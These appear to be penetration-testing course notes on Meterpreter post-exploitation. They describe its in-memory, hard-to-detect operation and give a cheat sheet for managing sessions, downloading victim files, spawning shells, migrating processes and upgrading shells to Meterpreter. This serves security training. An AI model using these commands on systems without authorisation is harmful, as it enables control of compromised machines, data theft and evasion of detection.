# iii - Post Exploitation Fundamentals

## Meterpreter Fundamentals

**Post Exploitation**

* Post exploitation refers to the actions performed on the target system after initial access has been obtained.
* The post exploitation phase of a penetration test consists of various techniques like:
  * Local Enumeration
  * Privilege Escalation
  * Dumping Hashes
  * Establishing Persistence
  * Clearing Your Tracks
  * Pivoting

### **Meterpreter**

* The Meterpreter (Meta-Interpreter) payload is an advanced multi-functional payload that operates via DLL injection and is executed in memory on the target system, consequently making it difficult to detect.
* It communicates over a stager socket and provides an attacker with an interactive command interpreter on the target system that facilitates the execution of system commands, file system navigation, keylogging and much more.
* Meterpreter also allows us to load custom script and plugins dynamically.
* MSF provides us with various types of meterpreter payloads that can be used based on the target environment and the OS architecture.

## **Practical Demonstration**

{% code overflow="wrap" lineNumbers="true" fullWidth="true" %}
```bash
# <command> -h for every meterpreter commands to see the corresponding flags.
meterpreter > sysinfo # info about the system
meterpreter > getuid # username info.
meterpreter > help # help menu.

# sessions management.
meterpreter > background # put session in bg or ctrl+z.
meterpreter > sessions -l # List all of your active sessions.
meterpreter > sessions -C <command> -i <sessionID> #Execute a command without having to interact with it.
meterpreter > sessions -K #Terminate all sessions
meterpreter > sessions -k <sessionID> #Terminate a particular session
meterpreter > sessions <sessionID> # Interact/switch btw session.
meterpreter > sessions -n <name> -i <sessionID> # Rename a session

# navigating in sessions.
# [W/L]-both windows and linux, [W]-windows, [L]-linux.
meterpreter > ls # List files in current directory [W/L]
meterpreter > pwd # Print the current directory [W/L]
meterpreter > cd #Change directory [W/L]
meterpreter > mkdir <name> #Create a directory [W/L]
meterpreter > rmdir <name> #Delete a directory [W/L]
meterpreter > cat <file> #Show the content of a file [W/L]
meterpreter > edit <file> #Allow to edit a file [W/L]
meterpreter > download <file> <localLocation> #Download a file.
kali@kali$ unzip flag5.zip
meterpreter > checksum md5 <file> # Get the md5 checksum of a file.
meterpreter > getenv PATH <environmentVariable> # Return environment variables [L], eg: getenv PATH, getenv TERM.
meterpreter > search -f <query> #Search for a file in the entire system.
# Use "-d" to indicate a directory in which to search. Compatible with wildcards, eg: search -d /usr/bin -f "backdoor" --> search the /usr/bin directory for a "backdoor" file.
# search -f *.jpg, *.php 

# spawning a shell on windows/linux.
meterpreter > shell #Open a shell in the target OS. Use /bin/bash -i to upgrade it to a bash prompt.
victim@shell$ ps # List all processes running on the system.
victim@shell$ ctrl+c # terminate the shell session.

meterpreter > ps # lists all processes in the target pc.
meterpreter > migrate <PID> # Migrate to another process using it's PID.
meterpreter > migrate -N <processName> # Migrate to another process using it's name.

# execute a cmd in meterpreter.
execute -f ifconfig # executes the ifconfig cmd.

# while in meterpreter you can still communicate with the local kali machine.
lpwd # print working dir of the kali pc.
lcd # change into a dir.
```
{% endcode %}



## Upgrading Command Shells to meterpreter Shells

<pre class="language-bash" data-overflow="wrap" data-line-numbers data-full-width="true"><code class="lang-bash"><strong># method 1
</strong><strong>msf5 > use post/multi/manage/shell_to_meterpreter #Upgrade a command shell to meterpreter
</strong>
# mehod 2
msf5 > sessions -u &#x3C;sessionID> # upgrade a command shell to meterpreter.
</code></pre>



